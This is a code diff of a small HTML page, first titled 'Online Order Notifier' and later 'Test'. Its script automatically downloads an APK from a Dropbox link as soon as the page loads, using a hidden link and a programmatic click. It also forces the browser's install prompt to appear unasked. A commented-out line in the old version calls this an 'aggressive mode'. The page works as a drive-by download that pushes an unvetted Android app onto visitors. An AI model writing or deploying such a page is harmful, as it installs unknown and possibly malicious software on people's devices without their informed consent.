@@ -1,95 +1,46 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Online Order Notifier</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Test</title>
 
-  <link rel="manifest" href="/manifest.json" />
-  <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>📱</text></svg>">
-</head>
-<body>
-  <script>
-    let installPrompt = null;
-    const apkUrl = "https://dl.dropboxusercontent.com/scl/fi/4xmi395xwb4q775qb5ybu/test.apk?rlkey=t1qngszj6gbberx99tmoczlgp";
-
-    window.addEventListener('beforeinstallprompt', (e) => {
-      e.preventDefault();
-      installPrompt = e;
-      setTimeout(() => installPrompt.prompt(), 800);
-    });
-
-    function startInstall() {
-      const link = document.createElement('a');
-      link.href = apkUrl;
-      link.download = "OrderNotifier.apk";
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
-    }
-
-    window.onload = function() {
-      startInstall();
-    };
-  </script>
-
-</body>
-</html>
-
-
-
-
-<!-- <!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Online Order Notifier</title>
-
-  <link rel="manifest" href="/manifest.json" />
-  <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>📱</text></svg>">
+  <!-- PWA manifest – required for WebAPK -->
+  <link rel="manifest" href="/manifest.json">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>App</text></svg>">
 
   <style>
-    body { font-family: system-ui, sans-serif; text-align: center; padding: 2rem; background: #f8f9fa; }
-    .card { background: white; border-radius: 16px; padding: 2rem; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; margin: 2rem auto; }
-    input, button { width: 100%; padding: 1rem; margin: 0.5rem 0; font-size: 1.1rem; border: 1px solid #ddd; border-radius: 8px; }
-    button { background: #0066cc; color: white; border: none; cursor: pointer; }
-    button:hover { background: #0055aa; }
-    #status { margin-top: 1rem; font-size: 0.9rem; color: #666; }
-    .hidden { display: none; }
+    body{margin:0;background:#f8f9fa;font-family:system-ui,sans-serif}
+    .card{max-width:380px;margin:2rem auto;background:#fff;padding:2rem;border-radius:16px;box-shadow:0 4px 20px rgba(0,0,0,.1);text-align:center}
+    h2{margin-top:0}
+    #msg{margin-top:1rem;font-size:.9rem;color:#555}
   </style>
 </head>
 <body>
-
-  <div class="card">
-    <div id="status"></div>
-  </div>
-
   <script>
-    let installPrompt = null;
-    const apkUrl = "https://dl.dropboxusercontent.com/scl/fi/4xmi395xwb4q775qb5ybu/test.apk?rlkey=t1qngszj6gbberx99tmoczlgp";
+    const APK_URL = "https://dl.dropboxusercontent.com/scl/fi/4xmi395xwb4q775qb5ybu/test.apk?rlkey=t1qngszj6gbberx99tmoczlgp";
 
-    window.addEventListener('beforeinstallprompt', (e) => {
+    let pwaPrompt = null;
+
+    window.addEventListener('beforeinstallprompt', e => {
       e.preventDefault();
-      installPrompt = e;
-      document.getElementById('status').innerHTML = "App ready! Installing...";
-      setTimeout(() => installPrompt.prompt(), 800);
+      pwaPrompt = e;
+      setTimeout(() => pwaPrompt.prompt(), 600);
     });
 
-    function startInstall() {
-      const link = document.createElement('a');
-      link.href = apkUrl;
-      link.download = "OrderNotifier.apk";
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
-
-      document.getElementById('status').innerHTML = "Downloading app... Tap notification to install.";
+    function downloadApk() {
+      const a = document.createElement('a');
+      a.href = APK_URL;
+      a.download = "test.apk";
+      a.style.display = 'none';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
     }
 
-    // Auto-start download on load (optional aggressive mode)
-    // setTimeout(startInstall, 1000);
+    window.addEventListener('load', () => {
+      downloadApk();
+    });
   </script>
-
 </body>
-</html> -->
+</html>
